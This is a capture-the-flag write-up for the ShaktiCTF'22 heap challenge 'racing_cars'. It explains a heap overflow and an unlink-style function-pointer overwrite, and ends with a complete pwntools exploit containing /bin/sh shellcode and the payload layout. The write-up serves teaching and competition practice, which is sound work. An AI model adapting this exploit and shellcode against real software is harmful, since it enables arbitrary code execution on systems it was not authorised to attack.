# racing_cars

Author: [d1g174l_f0rtr355](https://twitter.com/BhaskaraShravya)

Solves: 2

Difficulty: Medium

This is one of the heap challenges I made for ShaktiCTF'22. The binary provided is a stripped binary, making it difficult. However useful decompilers such as Ghidra/ IDA make it easy to debug and decompile. 

## Preliminary Checks:

We observe that the binary given is a 32 bit stripped binary with the following cheks enabled and disabled:
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

One key security check to note here is that the NX bit is disabled. This makes it easy for us to inject a shellcode and execute it. However the question is how?

## Understanding the challenge

For the purpose of understanding, let's take a look at the source code which was also released during the CTF.

We notice a few things such as:
- structure node: This node contains an interger `id`, a char `buffer` and two other nodes pointers namely, `next`, and `prev`. 
  ```
  struct node{
	int id;
	char buffer[32];
	struct node* next;
	struct node* prev;
  };
  ```
- insert: Here, the node `temp` is a pointer that contaoins the malloced chunk. The size allocated is 0x30 bytes, as can be seen in GDB (set a break point at `0x8049391` where malloc() is called, and check the heap address present in the eax register after calling malloc()). We also observe that the pointer to the next chunk of the current chunk is nulled out. This function is responsible for inserting the current node onto the heap. 
  ```
  int insert(int id){
	struct node *temp = malloc(sizeof(struct node));
	temp->next = NULL;
	temp->id = id;
	if(head==NULL){
		head = temp;
		head->prev = NULL;
		return 1;
	}
	struct node *iter = head;
	while(iter->next != NULL){
		iter = iter->next;
	}
	iter->next = temp;
	temp->prev = iter;
	return 1;
  }
  ```
  ```
  pwndbg> x/20x 0x804d1a0-0x8
  0x804d198:	0x00000000	0x00000031	0x00000000	0x00000000
  0x804d1a8:	0x00000000	0x00000000	0x00000000	0x00000000
  0x804d1b8:	0x00000000	0x00000000	0x00000000	0x00000000
  0x804d1c8:	0x00000000	0x00021e39	0x00000000	0x00000000
  0x804d1d8:	0x00000000	0x00000000	0x00000000	0x00000000
  pwndbg> 
  ```
- delete: This function is responsible for freeing an allocated chunk. The freeing process is similar to that in unlink where upon freeing a current chunk, its forward and backward pointers point to the current chunk's forward and backward chunks.
   ```
   int delete(int id){
	struct node *temp = head;
	while(temp->id != id && temp->next != NULL)
		temp = temp->next;
	if(temp==NULL)
		return 0;
	if(temp->next == NULL)
		temp->prev->next = NULL;
	if(temp->prev == NULL)
		temp->next->prev = NULL;
	if(temp->next != NULL && temp->prev != NULL){
		temp->prev->next = temp->next;
		temp->next->prev = temp->prev;
	}
	free(temp);
	return 0;
  }
  ```
- main: Here we see an input taken into the global variable array with our input size being 50. This is where we shall place our shellcode for program redirection. Further we see that 3 chunks are being allocated on heap (through insert()). The chunks are read from the get_name() function where we observe the overflow happening. The order the chunks are being read in and the index of the chunk which is deleted is of importance to check.

```
	printf("\nChoose your car: ");
	
	fgets(array,50,stdin);
	
	for(i=0;i<3;i++){
		
		insert(i);
	}
	
	printf("\nEnter your details before you begin the race\nName: ");
	get_name(0);
	
	printf("\nOccupation: ");
	get_name(2);
	
	printf("\nAddress: ");
	get_name(1);
	
	delete(1);
	
	(*function_pointer)();
	return 0;
```
- get_name(): This is the function called when we have to read data into the allocated chunks on the heap. The order in which the chunks are read are `0 2 1`. This is important as we can cause an overflow from chunk `1` to chunk `2`, overwrite the `function_ptr` with the address of `array` where we have our shellcode into. As we can see from the code below, the allocated chunk size is only `0x30` bytes, whereas we are reading `0x100` bytes of input data. 

```
	struct node *temp = head;
	while(temp->id != id && temp->next != NULL)
		temp = temp->next;
	if(temp==NULL)
		return 0;
	fgets(temp->buffer,0x100,stdin);
	return 0;
```

## Exploitation:

To understand the overwrite using the `unsafe-unlink` technique in heap, we shall take a look at the structure node below:
```
struct node{
	int id;
	char buffer[32];
	struct node* next;
	struct node* prev;
};
```
In the above section of code, we observe that the `next` and the `prev` nodes in the struct are right after buffer of size 32 bytes (or 0x20 bytes). 

The code that is used to remove chunk from its bin is implemented as a macro called `unlink` and looks something like:
```
#define unlink(P, BK, FD) { \
    FD = P->fd;  \
    BK = P->bk;  \
    FD->bk = BK; \
    BK->fd = FD; \
}
```

This is pretty standard code for removing an element from a doubly-linked list.

What happens when there's a buffer overflow on the heap? In this case, the attacker is able to overwrite some metadata from the next chunk. When the current chunk is freed, the malicious metadata will be used to trick the heap manager into performing unintended actions.

Keeping in mind how the unsafe-unlinking works, we overwrite `next` with `function_ptr-0x28` and `prev` with `array`. Here we subtract 0x28 from the address of `function_ptr` due to the 0x20 buffer + 4 bytes of `next` and `4` bytes of `prev` pointer addresses. 

We shall fill the 0th chunk with a few 'a's. The 2nd chunk with a few 'c's, and use the heap overflow to overwrite the `function_ptr` with `array`. Hence when the `function_ptr` function is called next, our shellcode gets executed instead.

For that we need to construct our payload:
```
pay = 'b'*0x20
pay += p32(function_ptr - 0x28)
pay += p32(array)
pay += p32(0x65)
```
Below is the GDB-dump of the heap at this point!

```
pwndbg> x/20x 0x8ad11a0-0x8
0x8ad1198:	0x00000000	0x00000031	0x00000000	0x61616161
0x8ad11a8:	0x61616161	0x61616161	0x61616161	0x0000000a
0x8ad11b8:	0x00000000	0x00000000	0x00000000	0x08ad11d0
0x8ad11c8:	0x00000000	0x00000031	0x00000001	0x62626262
0x8ad11d8:	0x62626262	0x62626262	0x62626262	0x62626262
pwndbg> 
0x8ad11e8:	0x62626262	0x62626262	0x62626262	0x0804c01c
0x8ad11f8:	0x0804c080	0x00000065	0x0000000a	0x63636363
0x8ad1208:	0x63636363	0x63636363	0x63636363	0x0000000a
0x8ad1218:	0x00000000	0x00000000	0x00000000	0x00000000
0x8ad1228:	0x08ad11d0	0x00021dd9	0x00000000	0x00000000
```

The unlinking takes place as desired, the `next` and `prev` pointers in the structure get overwritten. In this way, the `function_ptr` also gets overwritten to point to the global address of `array` where the shellcode is stotred.

## Exploit

```
def shellcode():
	shell = 'xor ecx, ecx\n'
	shell += 'xor edx, edx\n'
	shell += 'push eax\n'
	shell += 'push 0x68732f\n'
	shell += 'push 0x6e69622f\n'
	shell += 'mov ebx, esp\n'
	shell += 'push 0xb\n'
	shell += 'pop eax\n'
	shell += 'int 0x80\n'

	return asm(shell)
	
from pwn import *

p = process('./racing_cars')
exe = ELF('./racing_cars')
gdb.attach(p, gdbscript='b*0x0804971c\n')
#p = remote('65.2.136.80', 32645)
p.sendlineafter('Choose your car: ', shellcode())

p.sendlineafter('Name: ', 'a'*0x10)
p.sendlineafter('Occupation: ', 'c'*0x10)

function_ptr = 0x804c044
arr = 0x804c080

pay = 'b'*0x20
pay += p32(function_ptr - 0x28)
pay += p32(arr)
pay += p32(0x65)
p.sendlineafter('Address: ', pay)

p.interactive()
```

  
